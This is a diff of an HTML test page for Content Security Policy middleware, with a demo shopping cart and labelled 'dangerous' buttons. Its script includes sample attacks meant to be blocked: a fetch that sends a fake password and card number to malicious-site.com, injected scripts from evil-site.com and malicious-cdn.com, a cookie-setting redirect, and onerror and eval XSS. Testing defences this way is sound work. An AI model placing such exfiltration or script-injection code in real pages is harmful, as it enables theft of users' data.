@@ -1,11 +1,10 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>CSP Browser Test Page</title>
-
+    
     <style nonce="NONCE_PLACEHOLDER">
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -14,7 +13,7 @@
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: white;
         }
-
+        
         .container {
             max-width: 1200px;
             margin: 0 auto;
@@ -24,7 +23,7 @@
             -webkit-backdrop-filter: blur(10px);
             backdrop-filter: blur(10px);
         }
-
+        
         .test-section {
             margin: 20px 0;
             padding: 20px;
@@ -32,15 +31,15 @@
             border-radius: 10px;
             border-left: 4px solid #4CAF50;
         }
-
+        
         .test-section.danger {
             border-left-color: #f44336;
         }
-
+        
         .test-section.warning {
             border-left-color: #ff9800;
         }
-
+        
         .test-button {
             background: #4CAF50;
             color: white;
@@ -52,19 +51,19 @@
             font-size: 14px;
             type: button;
         }
-
+        
         .test-button:hover {
             background: #45a049;
         }
-
+        
         .test-button.danger {
             background: #f44336;
         }
-
+        
         .test-button.danger:hover {
             background: #da190b;
         }
-
+        
         .result {
             margin: 10px 0;
             padding: 10px;
@@ -72,19 +71,19 @@
             border-radius: 5px;
             font-family: monospace;
         }
-
+        
         .success {
             color: #4CAF50;
         }
-
+        
         .error {
             color: #f44336;
         }
-
+        
         .warning {
             color: #ff9800;
         }
-
+        
         .shopping-cart {
             background: rgba(255, 255, 255, 0.9);
             color: #333;
@@ -92,7 +91,7 @@
             border-radius: 10px;
             margin: 20px 0;
         }
-
+        
         .product {
             display: flex;
             justify-content: space-between;
@@ -100,16 +99,16 @@
             padding: 10px;
             border-bottom: 1px solid #eee;
         }
-
+        
         .product:last-child {
             border-bottom: none;
         }
-
+        
         .price {
             font-weight: bold;
             color: #2196F3;
         }
-
+        
         #console-output {
             background: #000;
             color: #0f0;
@@ -121,7 +120,7 @@
             margin: 20px 0;
         }
     </style>
-
+    
     <style>
         .malicious-style {
             background: red !important;
@@ -134,37 +133,34 @@
         }
     </style>
 </head>
-
 <body>
     <div class="container">
         <h1>🛡️ CSP Security Test Center</h1>
         <p>This page is designed to test the effectiveness of Content Security Policy (CSP) middleware.</p>
-
+        
         <!-- Safe Test Section -->
         <div class="test-section">
             <h2>✅ Safe Actions (Allowed)</h2>
             <p>These actions will be executed because they comply with CSP rules.</p>
-
+            
             <button type="button" class="test-button" onclick="safeFunction()">Run Safe Function</button>
             <button type="button" class="test-button" onclick="testSecureAjax()">Test Secure AJAX</button>
             <button type="button" class="test-button" onclick="addToCart('Safe Product', 99.99)">Add to Cart</button>
-
+            
             <div id="safe-results" class="result"></div>
         </div>
-
+        
         <div class="shopping-cart">
             <h3>🛒 Secure Shopping Cart</h3>
             <div class="product">
                 <span>MacBook Pro M3</span>
                 <span class="price">₺45,999</span>
-                <button type="button" class="test-button" onclick="addToCart('MacBook Pro M3', 45999)">Add to
-                    Cart</button>
+                <button type="button" class="test-button" onclick="addToCart('MacBook Pro M3', 45999)">Add to Cart</button>
             </div>
             <div class="product">
                 <span>iPhone 15 Pro</span>
                 <span class="price">₺32,999</span>
-                <button type="button" class="test-button" onclick="addToCart('iPhone 15 Pro', 32999)">Add to
-                    Cart</button>
+                <button type="button" class="test-button" onclick="addToCart('iPhone 15 Pro', 32999)">Add to Cart</button>
             </div>
             <div class="product">
                 <span>AirPods Pro</span>
@@ -173,57 +169,54 @@
             </div>
             <div id="cart-summary"></div>
         </div>
-
+        
         <div class="test-section danger">
             <h2>🚨 Dangerous Actions (Blocked)</h2>
             <p>These actions will be blocked by CSP.</p>
-
+            
             <button type="button" class="test-button danger" onclick="attemptXSS()">Try XSS Attack</button>
             <button type="button" class="test-button danger" onclick="attemptDataTheft()">Attempt Data Theft</button>
-            <button type="button" class="test-button danger" onclick="loadMaliciousScript()">Load Malicious
-                Script</button>
-
+            <button type="button" class="test-button danger" onclick="loadMaliciousScript()">Load Malicious Script</button>
+            
             <div id="danger-results" class="result"></div>
         </div>
-
-        <!-- Suspicious Test Section -->
+        
         <div class="test-section warning">
             <h2>⚠️ Suspicious Actions (Reported)</h2>
             <p>These actions will be reported to the CSP reporting system.</p>
-
+            
             <button type="button" class="test-button" onclick="attemptInlineScript()">Try Inline Script</button>
-            <button type="button" class="test-button" onclick="attemptExternalResource()">Load External
-                Resource</button>
-
+            <button type="button" class="test-button" onclick="attemptExternalResource()">Load External Resource</button>
+            
             <div id="warning-results" class="result"></div>
         </div>
-
+        
         <div class="test-section">
             <h2>📊 Test Results</h2>
             <div id="console-output"></div>
             <button type="button" class="test-button" onclick="clearConsole()">Clear Console</button>
         </div>
     </div>
-
+    
     <script nonce="NONCE_PLACEHOLDER">
         let cart = [];
-
+        
         function logToConsole(message, type = 'info') {
             const console_output = document.getElementById('console-output');
             const timestamp = new Date().toLocaleTimeString();
             const className = type === 'error' ? 'error' : type === 'warning' ? 'warning' : 'success';
-
+            
             console_output.innerHTML += `<div class="${className}">[${timestamp}] ${message}</div>`;
             console_output.scrollTop = console_output.scrollHeight;
             console.log(`[CSP Test] ${message}`);
         }
-
+        
         function safeFunction() {
             logToConsole('✅ Safe function executed successfully', 'success');
-            document.getElementById('safe-results').innerHTML =
+            document.getElementById('safe-results').innerHTML = 
                 '<span class="success">Safe action completed!</span>';
         }
-
+        
         function testSecureAjax() {
             fetch('/api/cart', {
                 method: 'POST',
@@ -231,32 +224,32 @@
                     'Content-Type': 'application/json',
                     'X-Requested-With': 'XMLHttpRequest'
                 },
-                body: JSON.stringify({
+                body: JSON.stringify({ 
                     action: 'test',
                     timestamp: Date.now()
                 })
             })
-                .then(response => response.json())
-                .then(() => {
-                    logToConsole('✅ Secure AJAX request successful', 'success');
-                    document.getElementById('safe-results').innerHTML =
-                        '<span class="success">AJAX request completed!</span>';
-                })
-                .catch(error => {
-                    logToConsole('❌ AJAX request failed: ' + error.message, 'error');
-                });
+            .then(response => response.json())
+            .then(() => {
+                logToConsole('✅ Secure AJAX request successful', 'success');
+                document.getElementById('safe-results').innerHTML = 
+                    '<span class="success">AJAX request completed!</span>';
+            })
+            .catch(error => {
+                logToConsole('❌ AJAX request failed: ' + error.message, 'error');
+            });
         }
-
+        
         function addToCart(productName, price) {
             cart.push({ name: productName, price: price });
             updateCartSummary();
             logToConsole(`✅ Added to cart: ${productName} - ₺${price}`, 'success');
         }
-
+        
         function updateCartSummary() {
             const summary = document.getElementById('cart-summary');
             const total = cart.reduce((sum, item) => sum + item.price, 0);
-
+            
             summary.innerHTML = `
                 <hr>
                 <strong>Cart Summary:</strong><br>
@@ -265,22 +258,22 @@
                 <button type="button" class="test-button" onclick="checkout()">Checkout</button>
             `;
         }
-
+        
         function checkout() {
             if (cart.length === 0) {
                 logToConsole('⚠️ Cart is empty!', 'warning');
                 return;
             }
-
+            
             logToConsole(`✅ Checkout started. Total: ₺${cart.reduce((sum, item) => sum + item.price, 0).toLocaleString()}`, 'success');
-
+            
             setTimeout(() => {
                 logToConsole('✅ Payment completed successfully!', 'success');
                 cart = [];
                 updateCartSummary();
             }, 2000);
         }
-
+        
         function attemptXSS() {
             try {
                 eval("alert('XSS Attack!')");
@@ -288,11 +281,11 @@
             } catch (error) {
                 logToConsole('✅ XSS attack blocked by CSP: ' + error.message, 'success');
             }
-
-            document.getElementById('danger-results').innerHTML =
+            
+            document.getElementById('danger-results').innerHTML = 
                 '<span class="success">XSS attack blocked!</span>';
         }
-
+        
         function attemptDataTheft() {
             try {
                 const sensitiveData = {
@@ -300,84 +293,87 @@
                     creditCard: '1234-5678-9012-3456',
                     personalInfo: 'Confidential data'
                 };
-
+                
                 fetch('http://malicious-site.com/steal', {
                     method: 'POST',
                     body: JSON.stringify(sensitiveData)
                 });
-
+                
                 logToConsole('❌ Data theft succeeded! (Should be blocked)', 'error');
             } catch (error) {
                 logToConsole('✅ Data theft attempt blocked by CSP: ' + error.message, 'success');
             }
-
-            document.getElementById('danger-results').innerHTML =
+            
+            document.getElementById('danger-results').innerHTML = 
                 '<span class="success">Data theft attempt blocked!</span>';
         }
-
+        
         function loadMaliciousScript() {
             try {
                 const script = document.createElement('script');
                 script.src = 'http://evil-site.com/malware.js';
                 document.head.appendChild(script);
-
+                
                 logToConsole('❌ Malicious script loaded! (Should be blocked)', 'error');
             } catch (error) {
                 logToConsole('✅ Malicious script load blocked by CSP: ' + error.message, 'success');
             }
-
-            document.getElementById('danger-results').innerHTML =
+            
+            document.getElementById('danger-results').innerHTML = 
                 '<span class="success">Malicious script blocked!</span>';
         }
-
+        
         function attemptInlineScript() {
             logToConsole('⚠️ Inline script attempt - reported to CSP', 'warning');
-            document.getElementById('warning-results').innerHTML =
+            document.getElementById('warning-results').innerHTML = 
                 '<span class="warning">Inline script attempt reported</span>';
         }
-
+        
         function attemptExternalResource() {
             try {
                 const img = document.createElement('img');
                 img.src = 'http://tracking-site.com/pixel.gif';
                 img.alt = "Tracking pixel";
                 document.body.appendChild(img);
-
+                
                 logToConsole('⚠️ External resource load attempt', 'warning');
             } catch (error) {
                 logToConsole('✅ External resource load blocked: ' + error.message, 'success');
             }
-
-            document.getElementById('warning-results').innerHTML =
+            
+            document.getElementById('warning-results').innerHTML = 
                 '<span class="warning">External resource attempt reported</span>';
         }
-
+        
         function clearConsole() {
             document.getElementById('console-output').innerHTML = '';
             logToConsole('Console cleared', 'info');
         }
-
-        document.addEventListener('DOMContentLoaded', function () {
+        
+        document.addEventListener('DOMContentLoaded', function() {
             logToConsole('🚀 CSP Test page loaded', 'success');
             logToConsole('Open browser console to view CSP violation messages', 'info');
         });
-
-        document.addEventListener('securitypolicyviolation', function (e) {
+        
+        document.addEventListener('securitypolicyviolation', function(e) {
             logToConsole(`🚨 CSP Violation: ${e.violatedDirective} - ${e.blockedURI}`, 'error');
         });
     </script>
-
+    
+    <!-- This inline script will be blocked by CSP -->
     <script>
         alert('This inline script should be blocked!');
         document.cookie = "malicious=true";
         window.location = "http://evil-site.com";
     </script>
-
+    
+    <!-- This external script will also be blocked -->
     <script src="http://malicious-cdn.com/evil.js"></script>
-
+    
+    <!-- This will also be blocked -->
     <img src="x" onerror="alert('Image XSS!')" alt="XSS Test Image">
-
+    
+    <!-- Inline event handler - blocked -->
     <div onclick="alert('Inline event handler!')">Click Me (Blocked)</div>
 </body>
-
 </html>
